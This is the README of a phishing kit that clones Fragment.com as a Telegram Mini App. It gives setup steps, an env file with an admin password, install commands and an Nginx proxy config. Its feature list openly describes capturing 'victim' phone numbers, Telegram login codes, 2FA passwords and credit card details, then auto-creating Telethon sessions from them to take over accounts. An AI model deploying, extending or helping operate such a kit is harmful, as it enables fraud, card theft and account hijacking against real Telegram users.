# Fragment Mini App System

This project is a cloning system of Fragment.com designed for Telegram Mini Apps. It includes a backend for data capture, a frontend mimicking Fragment, and an Admin Bot for control.

## ⚠️ Important Setup for the Mini App
The reason your link redirects to a channel is because the **Mini App Web App URL** is not correctly set in Telegram.

### How to Fix the Redirect:
1. Open **@BotFather** on Telegram.
2. Select your second bot (the one with the username `@selling` or similar).
3. Go to `Bot Settings` -> `Menu Button` OR `Web App`.
4. Create/Edit your Mini App named `fragment`.
5. Set the **Web App URL** to your VPS domain: `https://smskenya.net` (must be HTTPS).
6. Save the settings.

Now, when someone clicks `https://t.me/selling/fragment?startapp=XXXX`, it will open YOUR site inside Telegram instead of redirecting.

---

## 🚀 Deployment Guide

### 1. Requirements
- Python 3.10+
- Node.js & npm
- A Domain with SSL (e.g., `https://smskenya.net`)

### 2. Environment Configuration
Create a file named `.env` in the root directory and add:
```env
ADMIN_BOT_TOKEN=YOUR_FIRST_BOT_TOKEN
MINI_APP_BOT_TOKEN=YOUR_SECOND_BOT_TOKEN
MINI_APP_USERNAME=selling # The username of your second bot
ADMIN_PASSWORD=samiristhegoat
DOMAIN=smskenya.net
TELEGRAM_API_ID=YOUR_API_ID
TELEGRAM_API_HASH=YOUR_API_HASH
```
*Note: Get `TELEGRAM_API_ID` and `TELEGRAM_API_HASH` from https://my.telegram.org.*

### 3. Installation & Run
```bash
# Install Python libraries
pip install aiogram telethon fastapi uvicorn python-dotenv

# Build the Frontend
cd design
npm install
npm run build
cd ..

# Start the system
python3 run.py
```

## 🛠 Features
- **Admin Bot**: Control everything from one bot.
  - Send `/start` and enter the password.
  - Generate "Automated" links (shows victim's own info).
  - Generate "Custom" links (shows specific username/pfp/price).
- **Data Capture**: Captures Phone Number, Login Code, 2FA, and Credit Card details.
- **Auto-Login**: If API ID/Hash are provided, the system attempts to create a Telethon session automatically when the code is submitted.
- **Persistence**: All submissions are saved to `submissions.txt` and sessions are stored in the `sessions/` folder.

## 📡 Nginx Configuration (Example)
Make sure your Nginx is proxying traffic to port `8000`:
```nginx
location / {
    proxy_pass http://localhost:8000;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
```
*Don't forget to use Certbot for SSL.*
